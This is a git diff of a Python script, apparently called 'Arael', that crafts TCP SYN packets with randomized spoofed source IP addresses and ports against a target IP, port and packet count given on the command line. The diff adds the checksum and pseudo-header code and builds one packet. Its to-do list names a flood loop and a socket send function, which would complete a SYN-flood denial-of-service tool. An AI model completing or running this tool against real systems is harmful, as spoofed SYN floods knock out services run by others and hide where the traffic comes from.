@@ -3,24 +3,45 @@ from argparse import ArgumentParser
 from random import randint
 import struct
 import array
+import socket
 
-""" Todo:
-    - construct pseudo header
-    - finish checksum
-    - construct packet
-    - randomize src port
-    - build flood loop
-"""
+#-------------------To-do---------------------#
+
+#- build flood loop
+# - build function to send packets via sockets
+
+#---------------------------------------------# 
+
+#Calculate Checksum for TCP Packet
+
+def cal_checksum(packet: bytes) ->int:
+    if len(packet) % 2 != 0:
+        packet += b'\0'
+    #Convert Byte packet into aray of unsigned 16-bit ints and sum the values 
+    res = sum(array.array("H", packet))
+    #Extract the upper carry and lower 16 bit 
+    res = (res >> 16) + (res & 0xffff)
+    #Final Carry Fold if the sum still exceeds 16 bit
+    res += res >> 16
+    #Flip bits of the sum and mask the lower 16 to produce the checksum
+    return(~res) & 0xffff
 
 #Generate a randomized IP to sent the SYN packets from
 
 def rand_ip():
     ip = [randint(0,255) for _ in range(4)]
     rand_ip = ".".join(map(str, ip))
+     
     return(rand_ip)
 
+#Generate random port if
+
+def rand_port():
+    port = randint(1000,9000)
+    return port
+
 class TCPPacket:
-    def __intit__(self,
+    def __init__(self,
                   src_host:     str,
                   src_port:     int,
                   dst_host:     str,
@@ -50,12 +71,45 @@ class TCPPacket:
             0,              # Checksum (init, will be calculated later)
             0               # Urgent pointer
         )
+        #Construct pseudo header for TCP -> Size 12 Bytes
+        """
+            Composition of pseudo header:
+        _________________________________
+                | Src IP |
+        _________________________________
+                | Dst IP |
+        _________________________________
+        | Reserved | Protocol | TCP len |
+        
+        """
+        pseudohdr = struct.pack(
+            #Formatting to tell struct how to pack
+            #4s: 4 Byte string
+            #H: 16 Bit unsigned int
+            '!4s4sHH',
+            #Pack IP Adresses into 32 Bit representation
+            socket.inet_aton(self.src_host),#Src address
+            socket.inet_aton(self.dst_host),#Dst address
+            socket.IPPROTO_TCP,
+            len(packet)
+        )
+        #Construct checksum
+        checksum = cal_checksum(pseudohdr + packet)
+        
+        #testsum = checksum.to_bytes(2,'big')
+        #print(f"Checksum in hex:{testsum}")
+
+        packet = packet[:16] + struct.pack('H', checksum) + packet[18:]
+        #print(f"Packet: {packet}")
+        
+        return packet
+
 
 def args():
     #Define command-line args
     parser = ArgumentParser()
     parser.add_argument('-t', '--target', action='store', help='Specify the target IP address')
-    parser.add_argument('-p','--port', action='store', help='Specify the target port')
+    parser.add_argument('-p','--port', action='store',type=int, help='Specify the target port')
     parser.add_argument('-c', '--count', action='store', help='Specify the amount of packets sent')
     
     errors = []
@@ -64,8 +118,7 @@ def args():
 
     if args.target and args.port and args.count: 
         print("Arguments parsed")
-
-    #Raise error if args are missing
+     #Raise error if args are missing
     else:
         if args.target is None:
             errors.append("Error: --t or --target is required.")
@@ -75,27 +128,50 @@ def args():
             errors.append("Error: --c or --count is required.")
     if errors:
         raise ValueError("\n".join(errors))
+    
+    return args 
+
+def display_interface(src_ip, src_p, trg_ip, trg_p):
+    # Hardcoded ASCII art interface
+    interface = f"""
+    +----------------------------+
+                Arael
+    +----------------------------+
+    | Src IP:   = {src_ip} 
+    | Src Port: = {src_p}  
+    +----------------------------+
+    | Src IP:   = {trg_ip} 
+    | Trg Port: = {trg_p}  
+    +----------------------------+
+    """
+    print(interface)
 
 
 
-#Calculate Checksum for TCP Packet
-
-def checksum(packet: bytes) ->int:
-    if len(packet) % 2 != 0:
-        packet += b'\0'
-    #Convert Byte packet into aray of unsigned 16-bit ints and sum the values 
-    res = sum(array.array("H", packet))
-    #Extract the upper carry and lower 16 bit 
-    res = (res >> 16) + (res & 0xffff)
-    #Final Carry Fold if the sum still exceeds 16 bit
-    res += res >> 16
-    #Flip bits of the sum and mask the lower 16 to produce the checksum
-    return(~res) & 0xffff
 
 
 if __name__ == "__main__":
-    args()
-    print(rand_ip())
+    try:
+        parsed_args = args()
+        ip = rand_ip()
+        port = rand_port()
+        #print(f"Source IP: {ip}, Port: {port}")
+        #print(f"Target IP: {parsed_args.target}, Port: {parsed_args.port}, Count: {parsed_args.count}")
+        display_interface(ip,port,parsed_args.target, parsed_args.port)
+        pak = TCPPacket(
+            ip,
+            port,
+            parsed_args.target,
+            parsed_args.port,
+            0b000000010  
+        )
+
+        raw_pack = pak.build()
+        #Print Packet for debugging
+        #print(f"Built raw packet: {raw_pack}")
+        
+    except ValueError as e:   
+        print(e)        
 
 
 
